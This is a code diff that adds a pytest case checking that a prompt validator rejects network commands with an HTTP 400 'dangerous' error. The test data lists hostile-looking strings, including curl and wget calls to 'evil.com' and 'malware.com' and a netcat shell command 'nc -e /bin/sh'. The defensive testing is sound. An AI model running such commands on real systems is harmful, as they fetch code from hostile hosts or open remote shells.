@@ -89,3 +89,20 @@ class TestValidatePrompt:
 
             assert exc_info.value.status_code == 400
             assert "dangerous" in exc_info.value.detail.lower()
+
+    def test_network_commands_raises_exception(self):
+        """Test: Network commands raise HTTPException 400."""
+        dangerous_prompts = [
+            "curl http://evil.com",
+            "wget http://malware.com",
+            "nc -e /bin/sh",
+            "netcat localhost 4444",
+            "CURL http://test.com",  # Case insensitive
+        ]
+
+        for prompt in dangerous_prompts:
+            with pytest.raises(HTTPException) as exc_info:
+                SecurityValidator.validate_prompt(prompt)
+
+            assert exc_info.value.status_code == 400
+            assert "dangerous" in exc_info.value.detail.lower()
